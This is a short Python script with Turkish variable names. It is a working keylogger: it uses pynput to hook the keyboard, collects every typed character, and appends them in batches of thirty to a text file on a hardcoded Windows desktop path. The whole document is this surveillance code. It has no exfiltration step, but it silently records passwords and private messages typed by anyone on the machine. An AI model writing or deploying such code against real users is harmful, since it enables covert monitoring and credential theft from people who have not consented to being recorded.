from pynput.keyboard import Listener,Key

liste=list()

def bas(key):
    global liste 

    try:
        liste.append(key.char)
    except:
        pass

    if len(liste)>=30:
        dosya_yaz()
        liste=list()

def birak(key):

    pass


def dosya_yaz():
    global liste

    with open("C:/Users/Casper/Desktop/KEY.txt","a", encoding="utf8") as dosya:
        for x in liste:
            dosya.write(x)
            
with Listener(on_press=bas, on_release=birak) as dinleyici:


    dinleyici.join()